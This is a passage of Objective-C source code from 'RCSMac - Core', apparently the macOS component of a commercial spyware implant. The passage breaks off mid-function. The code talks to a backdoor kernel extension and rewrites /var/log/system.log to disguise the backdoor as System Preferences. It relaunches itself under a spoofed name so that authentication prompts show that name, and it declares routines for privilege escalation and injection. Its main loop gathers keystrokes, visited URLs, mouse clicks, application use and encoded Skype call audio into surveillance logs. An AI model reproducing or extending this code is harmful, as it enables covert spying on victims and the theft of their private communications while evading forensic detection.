/*
 * RCSMac - Core
 * 
 * Created by Alfredo 'revenge' Pesoli on 16/04/2009
 * Copyright (C) HT srl 2009. All rights reserved
 *
 */

#import <libgen.h>
#import <sys/ipc.h>
#import <sys/stat.h>
#import <sys/ioctl.h>
#import <sys/sysctl.h>
#import <notify.h>

#import <wchar.h>
#import <pwd.h>

#include <sys/mman.h>

#import <ScriptingBridge/ScriptingBridge.h>
#import <Carbon/Carbon.h>
#import <CommonCrypto/CommonDigest.h>

#import <Security/Authorization.h>
#import <Security/AuthorizationTags.h>

#include <IOKit/pwr_mgt/IOPMLib.h>
#include <IOKit/IOMessage.h>

#import "speex.h"

#import "RCSMCore.h"
#import "RCSMCommon.h"

#import "RCSMInfoManager.h"
#import "RCSMFileSystemManager.h"
#import "RCSMEncryption.h"
#import "RCSMLogManager.h"
#import "RCSMTaskManager.h"
#import "RCSMOsaxFiles.h"

#import "RCSMLogger.h"
#import "RCSMDebug.h"

#import "NSApplication+SystemVersion.h"

#define ICON_FILENAME  @"q45tyh"

//
// Old notification system
//
//#define kLOGOUT_INIT        CFSTR("com.apple.sessionmanager.allsessions.logoutInitiated")
//#define kRESTART_INIT       CFSTR("com.apple.sessionmanager.allsessions.restartInitiated")
//#define kSHUTDOWN_INIT      CFSTR("com.apple.sessionmanager.allsessions.shutdownInitiated")
//#define kLOGOUT_CONTINUED   CFSTR("com.apple.sessionmanager.allsessions.logoutContinued")
//#define kLOGOUT_CANCELLED   CFSTR("com.apple.sessionmanager.allsessions.logoutCancelled")
//#define kLW_QUIT_APPS       CFSTR("com.apple.sessionmanager.allsessions.logoutUserAppsTerminated")

//
// BSD notifications from loginwindow indicating shutdown (Leopard 10.5)
//

//   User clicked shutdown: may be aborted later
#define kLLWShutdowntInitiated       "com.apple.loginwindow.shutdownInitiated"

//   User clicked restart: may be aborted later
#define kLLWRestartInitiated         "com.apple.loginwindow.restartinitiated"

//   A previously initiated shutdown, restart, or logout, has been cancelled.
#define kLLWLogoutCancelled          "com.apple.loginwindow.logoutcancelled"

//   A previously initiated shutdown, restart, or logout has succeeded, and is 
//   no longer abortable by anyone. Point of no return!
#define kLLWLogoutPointOfNoReturn    "com.apple.loginwindow.logoutNoReturn"

//
// BSD notifications from loginwindow indicating shutdown (Snow Leopard 10.6)
//

//   User clicked shutdown: may be aborted later
#define kSLLWShutdowntInitiated       "com.apple.system.loginwindow.shutdownInitiated"

//   User clicked restart: may be aborted later
#define kSLLWRestartInitiated         "com.apple.system.loginwindow.restartinitiated"

//   A previously initiated shutdown, restart, or logout, has been cancelled.
#define kSLLWLogoutCancelled          "com.apple.system.loginwindow.logoutcancelled"

//   A previously initiated shutdown, restart, or logout has succeeded, and is 
//   no longer abortable by anyone. Point of no return!
#define kSLLWLogoutPointOfNoReturn    "com.apple.system.loginwindow.logoutNoReturn"

static int gLWShutdownNotificationToken               = 0;
static int gLWRestartNotificationToken                = 0;
static int gLWLogoutCancelNotificationToken           = 0;
static int gLWLogoutPointOfNoReturnNotificationToken  = 0;

static BOOL gHasVoipInFinishedRecording;
static BOOL gHasVoipOutFinishedRecording;

// backdoor descriptor for our own device (kext communication)
static int gBackdoorFD = 0;

io_registry_entry_t getRootDomain(void)
{
  static io_registry_entry_t gRoot = MACH_PORT_NULL;
  
  if (MACH_PORT_NULL == gRoot)
    gRoot = IORegistryEntryFromPath(kIOMasterPortDefault,
                                    kIOPowerPlane ":/IOPowerConnection/IOPMrootDomain");
  
  return gRoot;
}

IOReturn _setRootDomainProperty(CFStringRef                 key,
                                CFTypeRef                   val)
{
  return IORegistryEntrySetCFProperty(getRootDomain(), key, val);
}

//
// Shutdown handler
//
static void computerWillShutdown(CFMachPortRef port,
                                 void *msg,
                                 CFIndex size,
                                 void *info)
{
  mach_msg_header_t *header = (mach_msg_header_t *)msg;
  static bool shouldShutdown = false;
  
  if (header->msgh_id == gLWShutdownNotificationToken)
    {
      // Loginwindow put a shutdown confirm panel up on screen
      // The user has not necessarily even clicked on it yet
#ifdef DEBUG_CORE
      infoLog(@"Request for Shutdown");
#endif
      shouldShutdown = true;
    }
  else if (header->msgh_id == gLWRestartNotificationToken) 
    {
      // Loginwindow put a restart confirm panel up on screen
      // The user has not necessarily even clicked on it yet
#ifdef DEBUG_CORE
      infoLog(@"Request for Restart");
#endif
      shouldShutdown = true;
    }
  else if (header->msgh_id == gLWLogoutCancelNotificationToken) 
    {
#ifdef DEBUG_CORE
      infoLog(@"Shutdown operation cancelled");
#endif
      // Whatever shutdown, restart, or logout that was in progress has been cancelled.
      shouldShutdown = false;
    }
  else if (shouldShutdown 
           && (header->msgh_id == gLWLogoutPointOfNoReturnNotificationToken))
    {
      // Whatever shutdown or restart that was in progress has succeeded.
      // All apps are quit, there's no more user input required. We will
      // hereby disable sleep for the remainder of time spent shutting down
      // this machine.
      //_setRootDomainProperty(CFSTR("System Shutdown"), kCFBooleanTrue);
#ifdef DEBUG_CORE
      infoLog(@"Ok we're really shutting down NOW");
#endif
      
      const char *userName = [NSUserName() UTF8String];
      ioctl(gBackdoorFD, MCHOOK_UNREGISTER, userName);
    }
}

#pragma mark -
#pragma mark Private Interface
#pragma mark -

@interface RCSMCore (hidden)

- (void)_renameBackdoorAndRelaunch;

//
// Renames entries in /var/log/system.log which contains our backdoor name
//
- (void)_checkSystemLog;

//
// Speex encode and write to logs
// shouldn't be here but needs access to logManager
//
- (BOOL)_speexEncodeBuffer: (char *)source
                  withSize: (u_int)audioChunkSize
                  channels: (u_int)channels
                  forInput: (BOOL)isInput;

//
// Main thread
//
- (void)_communicateWithAgents;

//
// Guess all the required names before the backdoor starts
//
- (void)_guessNames;

//
// Build the internal app folders and plist files needed to execute the backdoor
//
- (void)_createInternalFilesAndFolders;

- (void)_resizeSharedMemoryWindow;

- (BOOL)_createAndInitSharedMemory;

- (void)_checkForOthers;

- (BOOL)_SLIEscalation;

- (BOOL)_UISpoof;

- (BOOL)_dropInputManager;

- (void)_solveKernelSymbolsForKext;

- (void)_dropOsaxBundle;

- (void)_registerForShutdownNotifications;

@end

#pragma mark -
#pragma mark Private Implementation
#pragma mark -

@implementation RCSMCore (hidden)

- (void)_renameBackdoorAndRelaunch
{
#ifdef DEBUG_CORE
  warnLog(@"Spoofing and relaunching ourself, appName is %@", mApplicationName);
#endif
  
  //
  // Renaming the application executable in order to spoof the UI Application
  // name which will appear on the Authentication dialog
  //
  [[NSFileManager defaultManager] copyItemAtPath: [[NSBundle mainBundle] executablePath]
                                          toPath: mSpoofedName
                                           error: nil];
  
  //
  // Executing ourself with the new executable name and exit
  //
  [gUtil executeTask: mSpoofedName
       withArguments: nil
        waitUntilEnd: NO];
  
  exit(0);
}

- (int)_createAdvisoryLock: (NSString *)lockFile
{
  NSError *error;
  BOOL success = [@"" writeToFile: lockFile
                       atomically: NO
                         encoding: NSUnicodeStringEncoding
                            error: &error];
  
  //
  // Here we might get a privilege error in case the lock is on
  //
  if (success == YES)
    {
      NSFileHandle *lockFileHandle = [NSFileHandle fileHandleForReadingAtPath:
                                      lockFile];
#ifdef DEBUG_CORE
      infoLog(@"Lock file created succesfully");
#endif
      
      if (lockFileHandle)
        {
          int fd = [lockFileHandle fileDescriptor];
          
          if (flock(fd, LOCK_EX | LOCK_NB) != 0)
            {
#ifdef DEBUG_CORE
              errorLog(@"Failed to acquire advisory lock");
#endif
              
              return -1;
            }
          else
            {
#ifdef DEBUG_CORE
              infoLog(@"Advisory lock acquired correctly");
#endif
              
              return fd;
            }
        }
      else
        {
          return -1;
        }
    }
  else
    {
#ifdef DEBUG_CORE
      errorLog(@"%@", error);
#endif
    }
  
  return -1;
}

- (void)_checkSystemLog
{
  NSAutoreleasePool *outerPool  = [[NSAutoreleasePool alloc] init];
  NSMutableString *fileData     = [[NSMutableString alloc]
                                   initWithContentsOfFile: @"/var/log/system.log"];
  NSString *backdoorPath        = [[NSBundle mainBundle] executablePath];
  
  NSString *backdoorPath2       = [NSString stringWithFormat: @"%@",
                                   [[[NSBundle mainBundle] bundlePath]
                                    stringByAppendingPathComponent: @"System Preferences"]];
  
  u_int size = 400;
  u_int startOfft = ([fileData length] > size)
                      ? [fileData length] - size
                      : [fileData length];
  
  u_int len = ([fileData length] > size)
                ? size
                : [fileData length];
  
  [fileData replaceOccurrencesOfString: backdoorPath
                            withString: @"/Applications/System Preferences.app/Contents/MacOS/System Preferences"
                               options: NSCaseInsensitiveSearch
                                 range: NSMakeRange(startOfft, len)];
  
  [fileData replaceOccurrencesOfString: backdoorPath2
                            withString: @"/Applications/System Preferences.app/Contents/MacOS/System Preferences"
                               options: NSCaseInsensitiveSearch
                                 range: NSMakeRange(startOfft, len)];
  
  [fileData writeToFile: @"/var/log/system.log"
             atomically: YES
               encoding: NSUTF8StringEncoding
                  error: nil];
  
  NSArray *_tempArguments = [[NSArray alloc] initWithObjects:
                             @"root:admin",
                             @"/var/log/system.log",
                             nil];
  
  [gUtil executeTask: @"/usr/sbin/chown"
        withArguments: _tempArguments
         waitUntilEnd: YES];
  
  [_tempArguments release];
  [fileData release];
  [outerPool drain];
}

- (BOOL)_speexEncodeBuffer: (char *)source
                  withSize: (u_int)audioChunkSize
                  channels: (u_int)channels
                  forInput: (BOOL)isInput
{
#define SPEEX_MODE_UWB        2
#define SINGLE_LPCM_UNIT_SIZE 4 // sizeof(float)
  // Single lpcm unit already casted to SInt16
  SInt16 *bitSample;
  // Speex state
  void *speexState;
  
  SInt16 *inputBuffer;
  SInt16 *floatToSInt16Buffer;
  
  char *outputBuffer;
  char *ptrSource;
  char *ptrSInt16Buffer;
  
  SpeexBits speexBits;
  
  u_int frameSize       = 0;
  u_int i               = 0;
  u_int j               = 0;
  u_int bytesWritten    = 0;
  
  // Harcoded values for testing
  u_int complexity      = 1;
  u_int quality         = (gSkypeQuality != 0) ? gSkypeQuality : 5;
  
  RCSMLogManager *_logManager = [RCSMLogManager sharedInstance];
  
  // Create a new wide mode encoder
  speexState = speex_encoder_init(speex_lib_get_mode(SPEEX_MODE_UWB));
  
  // Set quality and complexity
  speex_encoder_ctl(speexState, SPEEX_SET_QUALITY, &quality);
  speex_encoder_ctl(speexState, SPEEX_SET_COMPLEXITY, &complexity);
  
  speex_bits_init(&speexBits);
  
  // Get frame size for given quality and compression factor
  speex_encoder_ctl(speexState, SPEEX_GET_FRAME_SIZE, &frameSize);
  
  if (!frameSize)
    {
#ifdef DEBUG_CORE
      errorLog(@"Error while getting frameSize from speex");
#endif
      
      speex_encoder_destroy(speexState);
      speex_bits_destroy(&speexBits);
      
      return FALSE;
    }
  
#ifdef DEBUG_CORE
  infoLog(@"frameSize: %d", frameSize);
#endif
  
  //
  // Allocate the output buffer including the first dword (bufferSize)
  //
  if (!(outputBuffer = (char *)malloc(frameSize * SINGLE_LPCM_UNIT_SIZE + sizeof(u_int))))
    {
#ifdef DEBUG_CORE
      errorLog(@"Error while allocating output buffer");
#endif
      
      speex_encoder_destroy(speexState);
      speex_bits_destroy(&speexBits);
      
      return FALSE;
    }
  
  //
  // Allocate the input buffer
  //
  if (!(inputBuffer = (SInt16 *)malloc(frameSize * sizeof(SInt16))))
    {
#ifdef DEBUG_CORE
      errorLog(@"Error while allocating input float buffer");
#endif
      
      free(outputBuffer);
      speex_encoder_destroy(speexState);
      speex_bits_destroy(&speexBits);
      
      return FALSE;
    }
  
  //
  // Allocate the conversion buffer
  //
  if (!(floatToSInt16Buffer = (SInt16 *)malloc(audioChunkSize)))
    {
#ifdef DEBUG_CORE
      errorLog(@"Failed to allocate floatToSInt16Buffer");
#endif
      free(outputBuffer);
      free(inputBuffer);
      
      speex_encoder_destroy(speexState);
      speex_bits_destroy(&speexBits);
      
      return FALSE;
    }
  
  //
  // Make the conversion from Float32 to SInt16
  //
  float *fPcms = (float *)source;
  for (i = 0; i < audioChunkSize / sizeof(float); i++)
    {
      float temp = (fPcms[i] * (32767.0f));
      SInt16 value = lrintf(temp);
      floatToSInt16Buffer[j++] = value;
    }
  
  ptrSInt16Buffer = (char *)floatToSInt16Buffer;
#ifdef DEBUG_SPEEX
  verboseLog(@"Audio Chunk SIZE: %d", audioChunkSize);
  
  // Write a Wav
  NSMutableData *headerData       = [[NSMutableData alloc] initWithLength: sizeof(waveHeader)];
  NSMutableData *audioData        = [[NSMutableData alloc] init];
  
  waveHeader *waveFileHeader      = (waveHeader *)[headerData bytes];
  
  NSString *riff    = @"RIFF";
  NSString *waveFmt = @"WAVEfmt ";
  NSString *data    = @"data";
  
  int audioSize = audioChunkSize / 2;
  int fileSize = audioSize + 44; // size of header + strings
  int fmtSize  = 16;
  
  waveFileHeader->formatTag       = 1;
  waveFileHeader->nChannels       = 2;
  //waveFileHeader->nSamplesPerSec  = 48000;
  waveFileHeader->nSamplesPerSec  = 44100;
  waveFileHeader->bitsPerSample   = 16;
  waveFileHeader->blockAlign      = (waveFileHeader->bitsPerSample / 8) * waveFileHeader->nChannels;
  waveFileHeader->nAvgBytesPerSec = waveFileHeader->nSamplesPerSec * waveFileHeader->blockAlign;
  
  //waveFileHeader->blockAlign      = waveFileHeader->nAvgBytesPerSec = (waveFileHeader->bitsPerSample / 8) * waveFileHeader->nChannels;
  
  [audioData appendData: [riff dataUsingEncoding: NSUTF8StringEncoding]];
  [audioData appendBytes: &fileSize
                  length: sizeof(int)];
  [audioData appendData: [waveFmt dataUsingEncoding: NSUTF8StringEncoding]];
  
  [audioData appendBytes: &fmtSize
                  length: sizeof(int)];
  [audioData appendData: headerData];
  [audioData appendData: [data dataUsingEncoding: NSUTF8StringEncoding]];
  [audioData appendBytes: &audioSize
                  length: sizeof(int)];
  
  // Append audio chunk
  [audioData appendBytes: floatToSInt16Buffer
                  length: audioChunkSize / 2];
  
  time_t t;
  time(&t);
  
  NSString *fileName = [[NSString alloc] initWithFormat: @"/tmp/tempAudio-%d.wav", t];
  
  [audioData writeToFile: fileName
              atomically: YES];
  
  [headerData release];
  [audioData release];
  
  NSMutableData *fileData = [[NSMutableData alloc] init];
#endif
  
  //
  // We skip one channel by multiplying per channels inside the for condition
  // and inside the inner for with bitSample
  //
  for (ptrSource = ptrSInt16Buffer;
       ptrSource + (frameSize  * (SINGLE_LPCM_UNIT_SIZE / 2) * channels) <= ptrSInt16Buffer + (audioChunkSize / 2);
       ptrSource += (frameSize * (SINGLE_LPCM_UNIT_SIZE / 2) * channels))
    {
      bitSample = (SInt16 *)ptrSource;
      
      for (i = 0; i < frameSize; i ++)
        {
          // Just to avoid clipping on GSM with speex
          // 1.2 db line loss
          inputBuffer[i] =  bitSample[i * channels] - (bitSample[i * channels] / 4);
        }
      
      speex_bits_reset(&speexBits);
      speex_encode_int(speexState, inputBuffer, &speexBits);
      
      // Encode and store the result in the outputBuffer + first dword (length)
      bytesWritten = speex_bits_write(&speexBits,
                                      (char *)(outputBuffer + sizeof(u_int)),
                                      frameSize * SINGLE_LPCM_UNIT_SIZE);
      
      // If bytesWritten is greater than our condition, something wrong happened
      if (bytesWritten > (frameSize * SINGLE_LPCM_UNIT_SIZE))
        continue;
      
      // Store the audioChunk size in the first dword of outputBuffer
      memcpy(outputBuffer, &bytesWritten, sizeof(u_int));
      
      if (isInput == YES)
        {
          NSMutableData *tempData = [[NSMutableData alloc] initWithBytes: outputBuffer
                                                                  length: bytesWritten + sizeof(u_int)];
#ifdef DEBUG_SPEEX
          [fileData appendData: tempData];
#endif
          [_logManager writeDataToLog: tempData
                             forAgent: AGENT_VOIP// + VOIP_SKYPE
                            withLogID: SKYPE_CHANNEL_INPUT];
          
          [tempData release];
        }
      else
        {
          NSMutableData *tempData = [[NSMutableData alloc] initWithBytes: outputBuffer
                                                                  length: bytesWritten + sizeof(u_int)];
#ifdef DEBUG_SPEEX
          [fileData appendData: tempData];
#endif
          [_logManager writeDataToLog: tempData
                             forAgent: AGENT_VOIP// + VOIP_SKYPE
                            withLogID: SKYPE_CHANNEL_OUTPUT];
          
          [tempData release];
        }
    }

#ifdef DEBUG_SPEEX
  time_t ut;
  time(&ut);
  
  NSString *outFile = [[NSString alloc] initWithFormat: @"/tmp/speexEncoded-%d.wav", ut];
  
  [fileData writeToFile: outFile
             atomically: YES];
  
  [outFile release];
  [fileData release];
#endif
  
  free(inputBuffer);
  free(outputBuffer);
  free(floatToSInt16Buffer);
  
  speex_encoder_destroy(speexState);
  speex_bits_destroy(&speexBits);
  
  return TRUE;
}

- (void)_communicateWithAgents
{
  //int agentIndex = 0;
  //int agentsCount = 8;
#ifdef DEBUG_CORE
  int x = 0;
#endif
  
  shMemoryLog *shMemLog;
  RCSMLogManager *_logManager   = [RCSMLogManager sharedInstance];
  RCSMTaskManager *_taskManager = [RCSMTaskManager sharedInstance];
  
#ifdef DEBUG_CORE
  infoLog(@"Start receiving log from agents");
#endif
  
  NSMutableData *voipInputData        = nil;
  NSMutableData *voipOutputData       = nil;
  
  gHasVoipInFinishedRecording         = NO;
  gHasVoipOutFinishedRecording        = NO;
  
  NSString *localFlag = nil;
  
  [gControlFlagLock lock];
  localFlag = [_taskManager getControlFlag];
  [gControlFlagLock unlock];
  
  while ([localFlag isEqualToString: @"RUNNING"])
    {
      NSAutoreleasePool *innerPool  = [[NSAutoreleasePool alloc] init];
      
      [gControlFlagLock lock];
      localFlag = [_taskManager getControlFlag];
      [gControlFlagLock unlock];
      
      NSMutableData *logData        = nil;
      NSMutableData *readData       = nil;
      
      readData = [gSharedMemoryLogging readMemoryFromComponent: COMP_CORE
                                                      forAgent: 0
                                               withCommandType: CM_CREATE_LOG_HEADER
                                                                | CM_LOG_DATA
                                                                | CM_CLOSE_LOG
                                                                | CM_CLOSE_LOG_WITH_HEADER];
      
      if (readData != nil)
        {
          shMemLog = (shMemoryLog *)[readData bytes];
          
#ifdef DEBUG_CORE         
          verboseLog(@"Logging shMemLog->agentID = 0x%x", shMemLog->agentID);
#endif          
          switch (shMemLog->agentID)
            {
            case AGENT_URL:
              {
                logData = [[NSMutableData alloc] initWithBytes: shMemLog->commandData
                                                        length: shMemLog->commandDataSize];
                
                if ([_logManager writeDataToLog: logData
                                       forAgent: AGENT_URL
                                      withLogID: 0] == TRUE)
                  {
#ifdef DEBUG_CORE
                    infoLog(@"URL logged correctly");
#endif
                  }
                
                break;
              }
            case AGENT_KEYLOG:
              {
                logData = [[NSMutableData alloc] initWithBytes: shMemLog->commandData
                                                        length: shMemLog->commandDataSize];

                if ([_logManager writeDataToLog: logData
                                       forAgent: AGENT_KEYLOG
                                      withLogID: 0] == TRUE)
                  {
#ifdef DEBUG_CORE
                    verboseLog(@"Log header agentID %x, status %x command size %d keylog %S", 
                               shMemLog->agentID, 
                               shMemLog->status,
                               shMemLog->commandDataSize,
                               shMemLog->commandData);
                    verboseLog(@"header data size %d", sizeof(shMemoryLog));
#endif
                  }
            
                break;
              }
            case AGENT_APPLICATION:
              {
                logData = [[NSMutableData alloc] initWithBytes: shMemLog->commandData
                                                        length: shMemLog->commandDataSize];
                
                if ([_logManager writeDataToLog: logData
                                       forAgent: AGENT_APPLICATION
                                      withLogID: 0] == TRUE)
                {
#ifdef DEBUG_CORE
                  verboseLog(@"Log header agentID %x, status %x command size %d", 
                             shMemLog->agentID, 
                             shMemLog->status,
                             shMemLog->commandDataSize);
                  verboseLog(@"header data size %lu", sizeof(shMemoryLog));
#endif
                }
                
                break;
              }
            case AGENT_MOUSE:
              {
#ifdef DEBUG_CORE
                verboseLog(@"Logs from mouse");
#endif
                logData = [[NSMutableData alloc] initWithBytes: shMemLog->commandData
                                                        length: shMemLog->commandDataSize];
                
                mouseAdditionalStruct *_mouseHeader = (mouseAdditionalStruct *)[logData bytes];
                int additionalSize = sizeof(mouseAdditionalStruct)
                                      + _mouseHeader->processNameLength
                                      + _mouseHeader->windowNameLength;
                
                NSMutableData *mouseAdditionalHeader = [[NSMutableData alloc] initWithData:
                                                        [logData subdataWithRange: NSMakeRange(0, additionalSize)]];
                
                NSMutableData *mouseData = [[NSMutableData alloc] initWithData: [logData subdataWithRange:
                                                                         NSMakeRange([mouseAdditionalHeader length],
                                                                                     [logData length] - [mouseAdditionalHeader length])]];
                //
                // Create log here since we need to pass anAgentHeader as the
                // additional file header
                //
                if ([_logManager createLog: AGENT_MOUSE
                               agentHeader: mouseAdditionalHeader
                                 withLogID: 0] == TRUE)
                  {
                    if ([_logManager writeDataToLog: mouseData
                                           forAgent: AGENT_MOUSE
                                          withLogID: 0] == TRUE)
                      {
#ifdef DEBUG_CORE
                        infoLog(@"Mouse click logged correctly");
#endif
                      }
                    else
                      {
#ifdef DEBUG_CORE
                        errorLog(@"Error while writing data to AGENT_MOUSE log");
#endif
                      }
                  }
                else
                  {
#ifdef DEBUG_CORE
                    errorLog(@"Error while creating AGENT_MOUSE log");
#endif
                  }
                
                [_logManager closeActiveLog: AGENT_MOUSE
                                  withLogID: 0];
                
                [mouseAdditionalHeader release];
                [mouseData release];
                
                break;
              }
            case AGENT_VOIP:
              {
#ifdef DEBUG_CORE
                verboseLog(@"Logs from Voip Agent");
#endif
                //
                // Protocol looks like
                // 1- Receive the CM_LOG_DATA^x
                // 2- Receive the CM_CLOSE_LOG_WITH_HEADER
                //
                logData = [[NSMutableData alloc] initWithBytes: shMemLog->commandData
                                                        length: shMemLog->commandDataSize];
                
                switch (shMemLog->commandType)
                  {
                  case CM_LOG_DATA:
                    {
#ifdef DEBUG_CORE
                      verboseLog(@"[ii] Received audio data from Skype");
#endif
                      
                      if (shMemLog->flag == SKYPE_CHANNEL_INPUT)
                        {
                          //if (gHasVoipInFinishedRecording == NO)
                            //{
                              if (voipInputData == nil)
                                {
                                  voipInputData = [[NSMutableData alloc] init];
                                }
                              
                              [voipInputData appendData: logData];
                            //}
                        }
                      else if (shMemLog->flag == SKYPE_CHANNEL_OUTPUT)
                        {
                          //if (gHasVoipOutFinishedRecording == NO)
                            //{
                              if (voipOutputData == nil)
                                {
                                  voipOutputData = [[NSMutableData alloc] init];
                                }
                              
                              [voipOutputData appendData: logData];
                            //}
                        }
                      
                      break;
                    }
                  case CM_CLOSE_LOG_WITH_HEADER:
                    {
#ifdef DEBUG_CORE
                      infoLog(@"[ii] Received a close log command from skype");
#endif
                      
                      NSData *_localPeer    = nil;
                      NSData *_remotePeer   = nil;
                      NSString *localPeer   = nil;
                      NSString *remotePeer  = nil;
                      
                      int32_t hiStopTime    = 0;
                      int32_t loStopTime    = 0;
                      
                      if ((shMemLog->flag & SKYPE_CHANNEL_INPUT) == SKYPE_CHANNEL_INPUT)
                        {
#ifdef DEBUG_CORE
                          infoLog(@"[ii] Voip - Closing input channel");
                          infoLog(@"[ii] audioChunk size: %d", [voipInputData length]);
#endif
                          
                          voipAdditionalStruct *_voipHeader = (voipAdditionalStruct *)[logData bytes];
                          int additionalSize = sizeof(voipAdditionalStruct)
                                                + _voipHeader->localPeerLength
                                                + _voipHeader->remotePeerLength;
                          
                          _localPeer = [[NSData alloc] initWithData:
                                        [logData subdataWithRange:
                                         NSMakeRange(sizeof(voipAdditionalStruct),
                                                     _voipHeader->localPeerLength)]];
                          
                          _remotePeer = [[NSData alloc] initWithData:
                                         [logData subdataWithRange:
                                          NSMakeRange(sizeof(voipAdditionalStruct)
                                                      + _voipHeader->localPeerLength,
                                                      _voipHeader->remotePeerLength)]];
                          
                          localPeer = [[NSString alloc] initWithData: _localPeer
                                                            encoding: NSUTF16LittleEndianStringEncoding];
                          remotePeer = [[NSString alloc] initWithData: _remotePeer
                                                             encoding: NSUTF16LittleEndianStringEncoding];
                          
                          [_localPeer release];
                          [_remotePeer release];
                          
                          hiStopTime = _voipHeader->hiStopTimestamp;
                          loStopTime = _voipHeader->loStopTimestamp;
#ifdef DEBUG_CORE
                          infoLog(@"hiStartRec: %x", _voipHeader->hiStartTimestamp);
                          infoLog(@"loStartRec: %x", _voipHeader->loStartTimestamp);
#endif
                          NSMutableData *voipAdditionalHeader = [[NSMutableData alloc] initWithData:
                                                                 [logData subdataWithRange: NSMakeRange(0, additionalSize)]];
                          
                          if ([_logManager createLog: AGENT_VOIP// + VOIP_SKYPE
                                         agentHeader: voipAdditionalHeader
                                           withLogID: SKYPE_CHANNEL_INPUT] == TRUE)
                            {
                              [self _speexEncodeBuffer: [voipInputData mutableBytes]
                                              withSize: [voipInputData length]
                                              channels: 2
                                              forInput: YES];
                            }
                          else
                            {
#ifdef DEBUG_CORE
                              errorLog(@"Error while creating log for input (skype)");
#endif
                            }
                            
                          [_logManager closeActiveLog: AGENT_VOIP// + VOIP_SKYPE
                                            withLogID: SKYPE_CHANNEL_INPUT];
                          [voipAdditionalHeader release];
                          
                          [voipInputData release];
                          voipInputData = nil;
                          
                          //
                          // Closing the call
                          //
                          if ((shMemLog->flag & SKYPE_CLOSE_CALL) == SKYPE_CLOSE_CALL)
                            {
                              gHasVoipInFinishedRecording = YES;
                              
#ifdef DEBUG_CORE
                              infoLog(@"Generating last entry log for input");
#endif
                              NSMutableData *entryData = [[NSMutableData alloc]
                                                          initWithLength: sizeof(voipAdditionalStruct)];
                              
                              //short dummyWord   = 0x0000;
                              u_int _dummydWord = 0xFFFFFFFF;
                              
                              NSMutableData *dummydWord = [[NSMutableData alloc] initWithBytes: &_dummydWord
                                                                                        length: sizeof(u_int)];
                              /*
                              time_t unixTime;
                              time(&unixTime);
                              
                              int64_t filetime = ((int64_t)unixTime * (int64_t)RATE_DIFF) + (int64_t)EPOCH_DIFF;
                              NSString *tmpPeerName = @"sux";
                              */
                              voipAdditionalStruct *voipAdditional    = (voipAdditionalStruct *)[entryData bytes];
                              voipAdditional->version                 = LOG_VOIP_VERSION;
                              voipAdditional->channel                 = CHANNEL_MICROPHONE;
                              voipAdditional->programType             = AGENT_VOIP + VOIP_SKYPE;
                              voipAdditional->sampleRate              = SAMPLE_RATE_SKYPE;
                              voipAdditional->isIngoing               = 0;
                              voipAdditional->hiStartTimestamp        = hiStopTime;
                              voipAdditional->loStartTimestamp        = loStopTime;
                              voipAdditional->hiStopTimestamp         = hiStopTime;
                              voipAdditional->loStopTimestamp         = loStopTime;
                              voipAdditional->localPeerLength         = [localPeer lengthOfBytesUsingEncoding: NSUTF16LittleEndianStringEncoding];
                              voipAdditional->remotePeerLength        = [remotePeer lengthOfBytesUsingEncoding: NSUTF16LittleEndianStringEncoding];
                              
                              // Local Peer Name
                              [entryData appendData: [localPeer dataUsingEncoding: NSUTF16LittleEndianStringEncoding]];
                              
                              // Null terminator
                              //[entryData appendBytes: &dummyWord
                              //                length: sizeof(short)];
                              
                              // Remote Peer Name
                              [entryData appendData: [remotePeer dataUsingEncoding: NSUTF16LittleEndianStringEncoding]];
                              
                              // Null terminator
                              //[entryData appendBytes: &dummyWord
                              //                length: sizeof(short)];

                              if ([_logManager createLog: AGENT_VOIP// + VOIP_SKYPE
                                             agentHeader: entryData
                                               withLogID: SKYPE_CHANNEL_INPUT] == TRUE)
                                {
                                  [_logManager writeDataToLog: dummydWord
                                                     forAgent: AGENT_VOIP// + VOIP_SKYPE
                                                    withLogID: SKYPE_CHANNEL_INPUT];
                                }
                              else
                                {
#ifdef DEBUG_CORE
                                  errorLog(@"Error while creating close log file for input (skype)");
#endif
                                }
                              
                              [_logManager closeActiveLog: AGENT_VOIP// + VOIP_SKYPE
                                                withLogID: SKYPE_CHANNEL_INPUT];
                              
                              [entryData release];
                              [dummydWord release];
                              
                              [localPeer release];
                              [remotePeer release];
                            }
                          
                          [voipAdditionalHeader release];
                        }
                      else if ((shMemLog->flag & SKYPE_CHANNEL_OUTPUT) == SKYPE_CHANNEL_OUTPUT)
                        {
#ifdef DEBUG_CORE
                          infoLog(@"[ii] Voip - Closing output channel");
                          infoLog(@"[ii] audioChunk size: %d", [voipOutputData length]);
#endif
                          voipAdditionalStruct *_voipHeader = (voipAdditionalStruct *)[logData bytes];
                          int additionalSize = sizeof(voipAdditionalStruct)
                                                + _voipHeader->localPeerLength
                                                + _voipHeader->remotePeerLength;
                          
                          _localPeer = [[NSData alloc] initWithData:
                                        [logData subdataWithRange:
                                         NSMakeRange(sizeof(voipAdditionalStruct),
                                                     _voipHeader->localPeerLength)]];
                          
                          _remotePeer = [[NSData alloc] initWithData:
                                         [logData subdataWithRange:
                                          NSMakeRange(sizeof(voipAdditionalStruct)
                                                      + _voipHeader->localPeerLength,
                                                      _voipHeader->remotePeerLength)]];
                          
                          localPeer = [[NSString alloc] initWithData: _localPeer
                                                            encoding: NSUTF16LittleEndianStringEncoding];
                          remotePeer = [[NSString alloc] initWithData: _remotePeer
                                                             encoding: NSUTF16LittleEndianStringEncoding];
                          
                          [_localPeer release];
                          [_remotePeer release];
                          
                          hiStopTime = _voipHeader->hiStopTimestamp;
                          loStopTime = _voipHeader->loStopTimestamp;
                          
                          NSMutableData *voipAdditionalHeader = [[NSMutableData alloc] initWithData:
                                                                 [logData subdataWithRange: NSMakeRange(0, additionalSize)]];
                          
                          if ([_logManager createLog: AGENT_VOIP// + VOIP_SKYPE
                                         agentHeader: voipAdditionalHeader
                                           withLogID: SKYPE_CHANNEL_OUTPUT] == TRUE)
                            {
                              [self _speexEncodeBuffer: [voipOutputData mutableBytes]
                                              withSize: [voipOutputData length]
                                              channels: 2
                                              forInput: NO];
                            }
                          else
                            {
#ifdef DEBUG_CORE
                              errorLog(@"Error while creating log for output (skype)");
#endif
                            }
                          
                          [voipAdditionalHeader release];
                          [_logManager closeActiveLog: AGENT_VOIP// + VOIP_SKYPE
                                            withLogID: SKYPE_CHANNEL_OUTPUT];
                          
                          [voipOutputData release];
                          voipOutputData = nil;
                          
                          //
                          // Closing call
                          //
                          if ((shMemLog->flag & SKYPE_CLOSE_CALL) == SKYPE_CLOSE_CALL)
                            {
                              gHasVoipOutFinishedRecording = YES;
                              
#ifdef DEBUG_CORE
                              infoLog(@"Generating last entry log for output");
#endif
